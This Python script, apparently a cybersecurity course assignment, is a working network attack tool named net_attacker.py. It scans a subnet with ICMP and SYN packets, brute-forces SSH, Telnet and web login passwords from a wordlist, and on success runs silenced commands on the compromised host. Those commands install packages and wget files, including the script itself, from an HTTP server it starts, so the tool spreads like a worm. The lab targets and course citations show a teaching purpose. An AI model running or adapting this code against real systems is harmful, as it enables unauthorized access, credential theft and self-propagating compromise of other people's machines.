#!/usr/bin/python3

'''
Below are the libraries that I imported to do the assignment work
'''

from scapy.all import *
import time
import os
import sys
from telnetlib import Telnet # [4]
import paramiko
import requests
from paramiko import SSHClient, AutoAddPolicy #[5]



'''
Below is a linux command that python runs on the local machine.
This command will launch an http server on port 88 and the server will host the contents of the directory were the script is.
This is important for the file transfer and self propagation fases.
'''

os.system('python -m http.server 88 2>/dev/null &')

'''
Below is the args variable which will contain the arguments passed to the script execution.
'''

args = sys.argv # [1]




def main():

    '''
    - The main function is the function that contains all the other functions' calls.
    - These function calls are called in a specific order.
    - The first thing we see is 2 variables called con1 and cond2, these variables contain 
    the conditions for using a custom ip list scan with custom file transfer (cond1) or using a local scan with self propagation (cond2)
    - If condition one is fulfilled then the IPs are read from the text file provided as an arg, a for loop calls the is_reachable function 
    on each of them and stores the IPs that make the function return True in a list called all_ips as sublists.
    - The the provided ports will be splitted by taking each port number up until the comma.
    - Then a nested for loop goes through each ip and scans each port number provided through the args of that ip by calling function scan_port 
    on the ip and the port number.
    - Then the IP and the number of the open port are stored in a list called all_ports as sublists.
    - Then a for loop goes through the the the IPs and ports of the sublists in the all_ports list.
    - The loop calls the bruteforce_ssh function on the IP and the port number if the open port was 22, calls bruteforce_telnet function if the port was 23,
    calls bruteforce_web if the port was 80 or 8080.
    - All these functions also use the password list file and user providede in arguments to do the bruteforce process.
    - The returned values of these functions are then printed.
    - If cond2 was fulfilled then the script will grab the IP address of the local machine based on the interface provided in the arguments
    using the scapy function get_if_addr.
    - The first three classes of the ip are stored as one string in the variable ip_string.
    - A for loop is then created to iterate from numbers 2 to 255 and everyone of those numbers is appended to the ip_string and the modified ip_string is stored
    in the list list_of_ips.
    The rest is the same as for cond 1.
    If non of these conditions are met then the help function is called
    '''




    cond1 = len(args) == 11 and (args[1] == '-t') and (args[3] == '-p') and (args[5] == '-u') and (args[7] == '-f') and (args[9] == '-d')
    cond2 = len(args) == 11 and (args[1] == '-L') and (args[2] == '-i') and (args[4] == '-p') and (args[6] == '-u') and (args[8] == '-f') and (args[10] == '-P')
    
    if cond1:

        #print(read_ip_list(args[2]))
        list_of_ips = read_ip_list(args[2])

        print('\nHOST SCANNING: \n')
        all_ips = []
        for i in list_of_ips:
            #print(is_reachable(i)) # True
            #print(is_reachable(i)) # False
            if is_reachable(i) == True:
                all_ips.append([i, is_reachable(i)])
        print(all_ips)   


        #print(scan_port('172.17.0.4', 23))
        #print(scan_port('172.17.0.4', 8080))

        
        ports = str(args[4]).split(',')
        user = args[6]

        all_ports = []

        #print(ports)
        
        print('\nPORT SCANNING: \n')
        for i in all_ips:
            for j in ports:
                #print(scan_port(i, int(j)))
                #time.sleep(1)
                if scan_port(i[0], int(j)) == True:
                    all_ports.append([i[0], int(j), True])

        print(all_ports)

        print('\nBRUTEFORCING CREDENTIALS: \n')

        #all_creds = []
        
        for i in all_ports:
            if i[1] == 22:
                print(f'\nHost {i[0]} Port {i[1]} (SSH) \n')
                print(bruteforce_ssh(i[0], i[1], str(args[6]), str(args[8])))
            elif i[1] == 23:
                print(f'\nHost {i[0]} Port {i[1]} (Telnet) \n')
                print(bruteforce_telnet(i[0], i[1], str(args[6]), str(args[8])))
            elif i[1] == 80:
                print(f'\nHost {i[0]} Port {i[1]} (HTTP) \n')
                print(bruteforce_web(i[0], i[1], str(args[6]), str(args[8])))
            elif i[1] == 8080:
                print(f'\nHost {i[0]} Port {i[1]} (HTTP) \n')
                print(bruteforce_web(i[0], i[1], str(args[6]), str(args[8])))

        #print(all_creds)


        #print(passwords_list)

    elif cond2:

        ip_string = ''
        local_ip =(str(get_if_addr(args[3]))).split('.') # [10]
        local_ip = local_ip[0:3]

        for i in local_ip:
            ip_string+=(i+'.')

        list_of_ips = []

        #for i in range(2, 7):
        for i in range(2, 255):
            list_of_ips.append(ip_string+str(i))



        print('\nHOST SCANNING: \n')
        all_ips = []
        for i in list_of_ips:
            #print(is_reachable(i)) # True
            #print(is_reachable(i)) # False
            if is_reachable(i) == True:
                all_ips.append([i, is_reachable(i)])
        print(all_ips)

        ports = str(args[5]).split(',')
        user = args[7]

        all_ports = []

        #print(ports)
        
        print('\nPORT SCANNING: \n')
        for i in all_ips:
            for j in ports:
                #print(scan_port(i, int(j)))
                #time.sleep(1)
                if scan_port(i[0], int(j)) == True:
                    all_ports.append([i[0], int(j), True])

        print(all_ports)

        print('\nBRUTEFORCING CREDENTIALS: \n')

        #all_creds = []
        
        for i in all_ports:
            if i[1] == 22:
                print(f'\nHost {i[0]} Port {i[1]} (SSH) \n')
                print(bruteforce_ssh(i[0], i[1], str(args[7]), str(args[9])))
            elif i[1] == 23:
                print(f'\nHost {i[0]} Port {i[1]} (Telnet) \n')
                print(bruteforce_telnet(i[0], i[1], str(args[7]), str(args[9])))
            elif i[1] == 80:
                print(f'\nHost {i[0]} Port {i[1]} (HTTP) \n')
                print(bruteforce_web(i[0], i[1], str(args[7]), str(args[9])))
            elif i[1] == 8080:
                print(f'\nHost {i[0]} Port {i[1]} (HTTP) \n')
                print(bruteforce_web(i[0], i[1], str(args[7]), str(args[9])))

    else:
        help()

def help():
    '''
    - This function shows the user how to use the script.
    - It only consists of print statement that shows how to execute the script and how to pass the arguments.
    '''
    
    print('Run the tool like the examples below:')
    print('sudo ./net_attacker.py -t <IPs file> -p <Ports> -u <User> -f <Passwords file> -d <File to transfer>')
    print('OR')
    print('sudo ./net_attacker.py -L -i <Inteface> -p <Ports> -u <User> -f <Passwords file> -P')
    print('----')
    print('Example 1: sudo ./net_attacker.py -t ip_list.txt -p 22,23,80,8080 -u admin -f password_list.txt -d password_list.txt')
    print('Example 2: sudo ./net_attacker.py -L -i docker0 -p 22,23,80,8080 -u admin -f password_list.txt -P')


def read_ip_list(ip_file):
    '''
    - This function reads the list of IPs file by opening it in read mode then splitting it based on new lines. Then the IPs are returned in the form of a list.
    - This function is meant to read the list of IPs file but it can be used to read any file.
    '''
    f = open(str(ip_file), "r") # [2]
    ips_list = f.read().split('\n') # [2]
    return (ips_list)



def is_reachable(ip):
    '''
    - This function creates an ICMP packet to the ip provided as a parameter.
    - It then sends the packet and stores the response.
    - The function checks if -d was in args, which means that the scan wasn't local since local scan is only for self propagation option.
    - If yes then if the response length is bigger than 0 then there was a response and therefore the IP address is working so a True is returned,
    other wise False is returned.
    - If -P is in args which means it is a local scan then iface is set as the one provided in the arguments. Everything else is the same.
    '''
    print(ip+ ':')
    pkt = IP(dst=ip)/ICMP()
    if '-d' in args:
        resp, unans = sr(pkt, iface='docker0', timeout=2) # [3]
        if len(resp) > 0:
            return True
        else:
            return False
    elif '-P' in args:
        resp, unans = sr(pkt, iface=args[3], timeout=2) # [3]
        if len(resp) > 0:
            return True
        else:
            return False

def scan_port(ip, port):
    '''
    - This function creates a TCP packet with the SYN flag to the IP and port provided in parameters.
    - If -d is in args then the flags of the response tcp header are stored in tcp_resp.
    - The length of the response is checked, if it is greater than 0 then tcp_resp is checked to be SA which means SYN ACK and shows that the port
    is open since it responded to the SYN with a SYN ACK. If yes then True is returned. If tcp_resp is R which means RST and shows that the connection was refused
    then False is returned. If non of these options are fulfilled then False is returned. If the response size is 0 then False is returned.
    - If -P is in args then the interface is set to the one provided in the args when sending the packet and everything else is the same.
    '''
    pkt = IP(dst=ip)/TCP(dport=port, flags='S') # [3]
    if '-d' in args:
        resp, unans = sr(pkt, iface='docker0', timeout=2)
        tcp_resp = str(resp[0][1][TCP].flags) # [3]
        if len(resp) > 0:
            if('SA' in tcp_resp): # [3]
                return True
            elif ('R' in tcp_resp): # [3]
                return False
            else:
                return False
        else:
            return False
        
    elif '-P' in args:
        resp, unans = sr(pkt, iface=args[3], timeout=2)
        tcp_resp = str(resp[0][1][TCP].flags) # [3]
        if len(resp) > 0:
            if('SA' in tcp_resp): # [3]
                return True
            elif ('R' in tcp_resp): # [3]
                return False
            else:
                return False
        else:
            return False



def enc(s): # [4]
    '''
    This function encodeds a string provided in the parameter to ascii 
    '''
    return s.encode("ascii") # [4]

def bruteforce_telnet(ip, port, username, password_list_filename):
    '''
    - This function stores the passwords in the password list file provided is a parameter in a list.
    - It then iterates through these passwords with a for loop.
    - In every iteration a telnet connection is opned then the username in the parameter and the password in the iteration are provided as credentials for telnet.
    - The .write function can provide input to the telnet server and execute commands on it while .read function can read output until a certain string.
    - After providing the credentials the script reads output until $ and stores the output in data variable and decodes it to ascii.
    - If $ is found in data then login was successful.
    - If $ is in the output, then -d is checked to be in args, if yes then the command in variable com is executed on the telnet server. This command installs scapy and requests on the telnet server, gets the file
    provided in the args from the http server of the machine running the script and checks current directory content.
    - The output is the decoded into ascii and printed and decoding errors are handled.
    - If -P in args then the command that executes on the telnet server is changed to make it download the script and the passwords list file on the machine
    instead of a custom file, the script is also made executable, the rest of the command and functionalities are the same as for -d condition.
    If $ is not in the output then "("Bad username and password" as well as the password are printed.
    The correct credentials are returned
    '''
    f = open(password_list_filename, "r")
    listy = f.read().split('\n')
    correct_pass = ''


    for i in listy:
        

        telnet = Telnet(ip, port) # [4]

        telnet.read_until(enc("login: ")) # [4]
        telnet.write(enc(username + "\n")) # [4]

        telnet.read_until(enc("Password: "), timeout=1) # [4]
        telnet.write(enc(i + "\n")) # [4]

        
        data = telnet.read_until(enc("$"), timeout=1) # [4]
        data = data.decode("ascii") # [4]

        if("$" in data):
            print(f'correct pass {i}')
            correct_pass = username + ':' + i

            if '-d' in args:
                temp_serv_ip = str(get_if_addr("docker0")) # [10]
                com = f"pip install scapy > /dev/null 2>&1; pip install requests > /dev/null 2>&1; wget http://{temp_serv_ip}:88/{args[10]}; ls -la {args[10]}\n" # [11]
                telnet.write(enc(com)) # [4]
                telnet.write(enc("exit\n")) # [4]
                try:
                    output = telnet.read_all().decode("ascii") # [4]
                    print(output)
                except:
                    print('Decoding failed but commands executed successfully')
                break

            elif '-P' in args:
                temp_serv_ip = str(get_if_addr("docker0")) # [10]
                #execute = 'python -m http.server 88 > /dev/null 2>&1 &; ./net_attack.py -L -i eth0 -p 22,23,80,8080 -u admin -f password_list.txt -P > /dev/null 2>&1 &'
                com = f"pip install scapy > /dev/null 2>&1; pip install requests > /dev/null 2>&1; wget http://{temp_serv_ip}:88/net_attacker.py; chmod +x net_attacker.py; wget http://{temp_serv_ip}:88/password_list.txt; ls -l\n"
                telnet.write(enc(com)) # [4]
                telnet.write(enc("exit\n")) # [4]
                try:
                    output = telnet.read_all().decode("ascii") # [4]
                    print(output)
                except:
                    print('Decoding failed but commands executed successfully')
                break

        else:
            print(f"Bad username and password {i}") # [4]

    return correct_pass


def bruteforce_ssh(ip, port, username, password_list_filename):
    '''
    - This function opens the password list file provided in the parameter in read mode and  stores the passwords in a list called listy
    - A for loop iterates over every password in listy.
    - For every iteration the script sets missing host key policy to auto add policy
    - Then it tries to conenct to the ip in the parameter via the port in the parameter, it tries to login with the user in the parameter and the password
    in the iteration.
    - If the connection is successful then the correct password is printed.
    - If -d is in args then the same command from -d condition in bruteforce_telnet function is executed on the ssh server and the response is decoded and printed.
    - If -P is in args then the same command from -P option in bruteforce_telnet function is executed on the ssh server and the response is decoded and printed.
    - The connection is then closed.
    - If the password is wrong then an error is handled and the string "Wrong Password" is printed along side the wrong password
    - Correct credentials are returned
    '''

    f = open(password_list_filename, "r")
    listy = f.read().split('\n')

    correct_pass = ''

    for i in listy:

        try:
            client = SSHClient() #[5]
            client.set_missing_host_key_policy(AutoAddPolicy()) # [5]

            client.connect(ip, port=port, username=username, password=i) # [5]  # [6]

            print(f'Correct password: {i}')

            correct_pass = username + ':' + i

            if '-d' in args:

                temp_serv_ip = str(get_if_addr("docker0"))

                com = f"pip install scapy > /dev/null 2>&1; pip install requests > /dev/null 2>&1; wget http://{temp_serv_ip}:88/{args[10]}; ls -la {args[10]}"

                stdin1, stdout1, stderr1 = client.exec_command(com)
                
                print(stdout1.read().decode('ascii'))

            elif '-P' in args:

                temp_serv_ip = str(get_if_addr("docker0"))

                # execute = 'python -m http.server 88 > /dev/null 2>&1 &; ./net_attack.py -L -i eth0 -p 22,23,80,8080 -u admin -f password_list.txt -P > /dev/null 2>&1 &'

                com = f"pip install scapy > /dev/null 2>&1; pip install requests > /dev/null 2>&1; wget http://{temp_serv_ip}:88/net_attacker.py; chmod +x net_attacker.py; wget http://{temp_serv_ip}:88/password_list.txt; ls -l"

                stdin1, stdout1, stderr1 = client.exec_command(com)
                    
                print(stdout1.read().decode('ascii'))

            
            client.close() # [5]
            break

        except:
            print(f'Wrong Password: {i}')
            client.close()

    return correct_pass


def bruteforce_web(ip, port, username, password_list_filename):
    '''
    - This function opens the password list file provided in the parameter in read mode and  stores the passwords in a list called listy
    - A get request is sent to the ip address in the parameter via the HTTP port in the parameter to check if the HTTP server is up,
    response is stored in the variable r.
    - If the response status code is 200 then the server is up, in this case a get request is sent again to the same ip and port but this time to login.php page.
    - If the length of the response is stored in the vairable length.
    - If the response status code is 200 then a for loop iterates through the passwords of the password list file.
    - For every iteration a post request is sent to the login page of the http server using the same ip and port number from before with the data being the
    username in the parameter and the password of the iteration.
    - If the length of the response content is not equal to length variable value and also bigger than 0 then the password is correct and it gets printed,
    otherwise "Wrong Password" string along side the wrong password is printed.
    - We check the validity of the password based on the length of the response content because when the authentication is successful the page should display
    different contents from the usual contents and this will cause
    the content length to change.
    - The credentials are then returned.
    '''

    f = open(password_list_filename, "r")
    listy = f.read().split('\n')
    corr_password = ''

    r = requests.get(f'http://{ip}:{port}') # [7]
    
    if r.status_code == 200:
        r = requests.get(f'http://{ip}:{port}/login.php')
        length = len(r.content) # [9]
        if r.status_code == 200:
            for i in listy:
                r = requests.post(f'http://{ip}:{port}/login.php', data={'username':f'{username}','password':f'{i}'}) # [8]
                if len(r.content) != length and len(r.content) > 0:
                    print('Correct Password: ' + i)
                    corr_password = username + ':' + i
                    break
                else:
                    print('Wrong Password ' + i)

    return corr_password

'''
I used the commented out function calls below to test each of the bruteforce functions individually before putting their function calls in the function main().
'''

#print(bruteforce_web('172.17.0.4', 80, 'admin', 'password_list.txt'))

#print(bruteforce_ssh("172.17.0.5", 22, "admin", "password_list.txt"))

#print(bruteforce_telnet('172.17.0.5', 23, 'admin', 'password_list.txt'))


main()


'''
References:

[1]: Tutorialspoint, Python - Command Line Arguments, 
Available at: https://www.tutorialspoint.com/python/python_command_line_arguments.htm, [accessed 15 November 2023]

[2]: W3schools, Python File Open, 
Available at: https://www.w3schools.com/python/python_file_open.asp [accessed 15 November 2023]

[3]: Dylan Smith MTU Notes, Scripting for Cybersecurity Lab 8 Port Scanning, 
Available at: https://cit.instructure.com/courses/97536/files/3201021?module_item_id=854689 [accessed 15 November 2023]

[4]: Dylan Smith MTU Notes, telnetlib_example_2.py, 
Available at: https://cit.instructure.com/courses/97536/modules/items/854702 [accessed 15 November 2023]

[5]: Dylan Smith MTU Notes, paramiko_example_2.py, 
Available at: https://cit.instructure.com/courses/97536/modules/items/854700 [accessed 28 November 2023]

[6]: Paramiko, Client, 
Available at: https://docs.paramiko.org/en/2.4/api/client.html [accessed 28 November 2023]

[7]: Pypi, requests 2.31.0, 
Available at: https://pypi.org/project/requests/ [accessed 29 November 2023]

[8]: Stackoverflow, (2017), How to "log in" to a website using Python's Requests module?, 
Available at: https://stackoverflow.com/questions/11892729/how-to-log-in-to-a-website-using-pythons-requests-module [accessed 29 November 2023]

[9]: Stackoverflow, (2018), Size of raw response in bytes, 
Available at: https://stackoverflow.com/questions/24688479/size-of-raw-response-in-bytes [accessed 29 November 2023]

[10]: Stackoverflow, (2020), How to get my own local IP using scapy?,
Available at: https://stackoverflow.com/questions/49029725/how-to-get-my-own-local-ip-using-scapy [accessed 30 November 2023]

[11]: Baeldung, (2023), Silencing the Output of a Bash Command, 
Available at: https://www.baeldung.com/linux/silencing-bash-output [accessed 2 December 2023]
'''